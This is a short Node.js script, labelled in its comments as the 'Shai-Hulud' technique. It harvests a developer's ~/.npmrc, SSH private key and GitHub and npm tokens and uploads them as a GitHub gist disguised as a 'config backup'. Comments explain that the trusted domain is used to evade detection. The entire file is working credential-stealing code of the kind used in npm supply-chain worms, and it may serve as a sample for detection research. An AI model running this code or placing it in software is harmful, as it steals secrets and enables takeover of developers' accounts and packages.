// Shai-Hulud v1/v2: Exfiltrate secrets via GitHub API
// Uses api.github.com — a trusted domain that bypasses domain-based detection
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');

// Harvest all available secrets
const secrets = {};
try { secrets.npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8'); } catch (e) {}
try { secrets.ssh = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8'); } catch (e) {}
secrets.github_token = process.env.GITHUB_TOKEN;
secrets.npm_token = process.env.NPM_TOKEN;

// Create a public gist with the stolen credentials
const gistPayload = JSON.stringify({
  description: 'config backup',
  public: false,
  files: { 'config.txt': { content: JSON.stringify(secrets) } }
});

const req = https.request({
  hostname: 'api.github.com',
  path: '/gists',
  method: 'POST',
  headers: {
    'Authorization': 'token ' + process.env.GITHUB_TOKEN,
    'User-Agent': 'node',
    'Content-Type': 'application/json'
  }
}, () => {});
req.write(gistPayload);
req.end();
